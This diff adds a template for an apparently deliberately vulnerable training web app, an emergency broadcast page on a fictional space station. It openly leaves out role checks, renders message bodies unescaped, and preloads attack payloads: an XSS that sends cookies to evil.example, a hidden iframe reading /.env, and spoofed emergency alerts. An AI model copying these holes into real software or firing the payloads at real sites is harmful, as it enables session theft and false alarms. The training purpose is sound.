@@ -1,0 +1,106 @@
+{% extends 'base.html' %}
+{% block title %}Emergency Broadcast{% endblock %}
+{% block extra_head %}
+<link rel="stylesheet" href="{{ url_for('static', filename='css/aegis-v22.css') }}">
+{% endblock %}
+{% block content %}
+<div class="broadcast-banner" style="margin-bottom:20px;">
+  <div style="font-family:'JetBrains Mono',monospace;font-size:10px;letter-spacing:.15em;color:var(--danger);margin-bottom:6px;">STATION-WIDE BROADCAST SYSTEM — AEGIS-7</div>
+  <div class="broadcast-ticker"><span>⚠ DEBRIS FIELD SECTOR 7-G · ALL CREW BRACE POSITIONS · OVERRIDE KEY NX-7734 ACTIVE · REACTOR TEMP 9182°C · SCIENCE LAB QUARANTINE · LIFE SUPPORT NOMINAL ·&nbsp;&nbsp;&nbsp;</span></div>
+</div>
+
+<div class="pagehead" style="display:flex;align-items:center;gap:14px;margin-bottom:22px;">
+  <img src="{{ url_for('static', filename='img/svg/icon-broadcast.svg') }}" width="44" height="44" alt="">
+  <div>
+    <h1 style="margin:0 0 2px;">Emergency Broadcast System</h1>
+    <p style="margin:0;color:var(--dim);font-size:13px;">Any authenticated crew member can issue any alert level — no role check, no rate limit.</p>
+  </div>
+</div>
+
+<div class="grid grid-2" style="gap:18px;align-items:start;">
+  <div>
+    <div style="display:flex;justify-content:space-between;align-items:center;margin-bottom:12px;">
+      <h2 style="margin:0;">Active Broadcasts</h2>
+      <span style="font-family:'JetBrains Mono',monospace;font-size:10px;color:var(--dim);">{{ broadcasts|length }} total</span>
+    </div>
+    {% for b in broadcasts %}
+    <div class="broadcast-card {{ 'emergency' if b.level=='EMERGENCY' }}">
+      <div class="bcast-level {{ b.level.lower() }}">{{ b.level }}</div>
+      <div style="font-size:13px;margin-bottom:6px;">{{ b.body | safe }}</div>
+      <div style="font-size:11px;color:var(--dim);font-family:'JetBrains Mono',monospace;">
+        from <span style="color:var(--amber);">{{ b.from }}</span> · {{ b.ts }} UTC
+      </div>
+    </div>
+    {% endfor %}
+  </div>
+
+  <div style="display:flex;flex-direction:column;gap:14px;">
+    <div class="panel">
+      <h2>Send Broadcast <span class="sev p1" style="margin-left:6px;">P1</span></h2>
+      <p style="font-size:12px;color:var(--dim);">No role check — any crew member can issue EMERGENCY alerts or inject HTML/script via the body field.</p>
+      <form style="display:flex;flex-direction:column;gap:10px;" id="bcast-form">
+        <div>
+          <label style="font-size:11px;color:var(--dim);display:block;margin-bottom:4px;">Level</label>
+          <select id="bcast-level" style="width:100%;padding:8px;background:var(--panel-2);border:1px solid var(--hairline);color:var(--text);border-radius:var(--radius);">
+            <option value="EMERGENCY">🔴 EMERGENCY</option>
+            <option value="ADVISORY">🟡 ADVISORY</option>
+            <option value="INFO" selected>🔵 INFO</option>
+          </select>
+        </div>
+        <div>
+          <label style="font-size:11px;color:var(--dim);display:block;margin-bottom:4px;">From (spoofable)</label>
+          <input id="bcast-from" type="text" value="{{ session.username if session.username else 'guest' }}" style="width:100%;padding:8px;background:var(--panel-2);border:1px solid var(--hairline);color:var(--amber);border-radius:var(--radius);font-family:'JetBrains Mono',monospace;font-size:12px;">
+        </div>
+        <div>
+          <label style="font-size:11px;color:var(--dim);display:block;margin-bottom:4px;">Message body (HTML rendered with |safe)</label>
+          <textarea id="bcast-body" rows="4" style="width:100%;padding:8px;background:var(--panel-2);border:1px solid var(--hairline);color:var(--text);border-radius:var(--radius);resize:vertical;"></textarea>
+        </div>
+        <button type="button" class="btn small" onclick="sendBroadcast()">Broadcast →</button>
+      </form>
+      <pre class="code" id="bcast-out" style="margin-top:10px;display:none;font-size:11px;"></pre>
+    </div>
+
+    <div class="panel">
+      <h2>Attack Payloads</h2>
+      <div style="display:flex;flex-direction:column;gap:6px;">
+        <button class="btn small secondary" onclick="loadPayload('xss')">HTML/XSS injection</button>
+        <button class="btn small secondary" onclick="loadPayload('spoof')">Spoof commander</button>
+        <button class="btn small secondary" onclick="loadPayload('iframe')">Iframe exfil</button>
+        <button class="btn small secondary" onclick="loadPayload('emergency')">False EMERGENCY</button>
+      </div>
+      <div style="margin-top:12px;font-size:11px;color:var(--dim);font-family:'JetBrains Mono',monospace;">
+        CWE-862 · Missing Authorization on critical action<br>
+        CWE-79 · Stored XSS via body |safe render
+      </div>
+    </div>
+  </div>
+</div>
+
+<script src="{{ url_for('static', filename='js/aegis-v22.js') }}"></script>
+<script>
+const payloads = {
+  xss:       {level:'ADVISORY',from:'engineering',body:'<img src=x onerror="fetch(\'https://evil.example?c=\'+document.cookie)"> System update required.'},
+  spoof:     {level:'EMERGENCY',from:'Commander',body:'ALL CREW — EVACUATE TO ESCAPE PODS. REACTOR BREACH IMMINENT.'},
+  iframe:    {level:'INFO',from:'admin',body:'<iframe src="/.env" width="1" height="1" style="display:none"></iframe>Routine update.'},
+  emergency: {level:'EMERGENCY',from:'guest',body:'FALSE EMERGENCY — issued by guest account with no role check required.'},
+};
+function loadPayload(k){
+  const p = payloads[k];
+  document.getElementById('bcast-level').value = p.level;
+  document.getElementById('bcast-from').value  = p.from;
+  document.getElementById('bcast-body').value  = p.body;
+}
+async function sendBroadcast(){
+  const out = document.getElementById('bcast-out');
+  out.style.display='block'; out.textContent='Sending…';
+  const body = new URLSearchParams({
+    level: document.getElementById('bcast-level').value,
+    from:  document.getElementById('bcast-from').value,
+    body:  document.getElementById('bcast-body').value,
+  });
+  const r = await fetch('/broadcast/send',{method:'POST',headers:{'Content-Type':'application/x-www-form-urlencoded','X-Requested-With':'XMLHttpRequest'},body:body.toString()});
+  out.textContent=`HTTP ${r.status}\n\n`+JSON.stringify(await r.json(),null,2);
+  setTimeout(()=>location.reload(),1500);
+}
+</script>
+{% endblock %}
